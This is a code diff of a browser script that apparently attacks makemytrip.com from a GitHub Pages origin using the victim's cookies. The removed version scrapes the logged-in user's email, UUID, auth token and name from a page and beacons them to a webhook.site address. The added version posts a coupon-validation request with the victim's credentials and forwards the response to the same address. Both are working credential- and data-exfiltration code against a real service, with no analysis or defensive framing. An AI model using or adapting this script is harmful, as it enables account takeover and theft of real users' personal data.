@@ -1,35 +1,27 @@
 <script>
-fetch("https://www.makemytrip.com/apos-frontend/releases/Zhvy2kfRqOk7H0zojGVP4Zwwq2WCIpNr/default/public-bundle.css/", {
-  method: "GET",
+fetch("https://mapi.makemytrip.com/clientbackend/cg/validate-coupon/DESKTOP/2", {
+  method: "POST",
   credentials: "include",
   headers: {
-    "Origin": "https://bruno1777.github.io"
-  }
-})
-.then(res => res.text())
-.then(body => {
-  // extract __USER_DATA__
-  const match = body.match(/window\.__USER_DATA__\s*=\s*(\[\{.+?\}\]);/);
-
-  if (match) {
-    const userData = JSON.parse(match[1])[0];
-
-    const email = userData.userDetails.extendedUser.primaryEmailId;
-    const uuid = userData.userDetails.extendedUser.uuid;
-    const auth = userData.authToken;
-    const name = userData.userDetails.extendedUser.personalDetails.name;
-    const fullName = `${name.firstName} ${name.lastName}`;
-
-    // blind exfil via GET image
-    const img = new Image();
-    img.src = `https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?email=${encodeURIComponent(email)}&uuid=${uuid}&auth=${auth}&name=${encodeURIComponent(fullName)}`;
-  } else {
-    const i = new Image();
-    i.src = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?error=NO_MATCH";
-  }
-})
-.catch(err => {
-  const i = new Image();
-  i.src = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?error=" + encodeURIComponent(err.message);
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    countryCode: "IN",
+    txnKey: "aaa",
+    couponCode: "MMTNEW",
+    removeCoupon: false,
+    userLocation: { city: "aaa", state: "aaa", country: "aaa" },
+    requestDetails: {
+      journeyId: "aaa",
+      requestId: "aaa",
+      sessionId: "aaa"
+    }
+  })
+}).then(r => r.text()).then(data => {
+  // Send response back to you
+  fetch("https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8", {
+    method: "POST",
+    body: data
+  });
 });
 </script>
